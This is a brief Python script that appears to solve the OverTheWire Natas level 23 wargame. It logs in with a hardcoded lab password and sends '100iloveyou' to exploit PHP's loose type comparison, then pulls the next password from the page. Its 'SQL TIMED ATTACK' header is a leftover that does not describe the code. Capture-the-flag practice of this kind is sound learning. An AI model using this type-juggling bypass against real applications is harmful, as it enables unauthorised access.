#!/usr/bin/env python
# SQL TIMED ATTACK
import requests
import re
from string import *
from time import *

characters = lowercase + uppercase + digits	
	
username='natas23'
password='D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE'

url = 'http://%s.natas.labs.overthewire.org/' %username

path = 'index-source.html'
session = requests.session()


response = session.post(url, auth=(username, password), data={'passwd':'100iloveyou', 'submit':'Login'})

content = response.text
# print content
print  re.findall('Password: (.*)</pre>', content)[0]

#For this there was only need to know about data types in php.
#To get the password, we needed to match a string stored in passwd and at the same time the passwd value had to be greater than 10.
#In php the data types dont matter much so with 100iloveyou, it'll first consider 100 as an integer and then the rest as string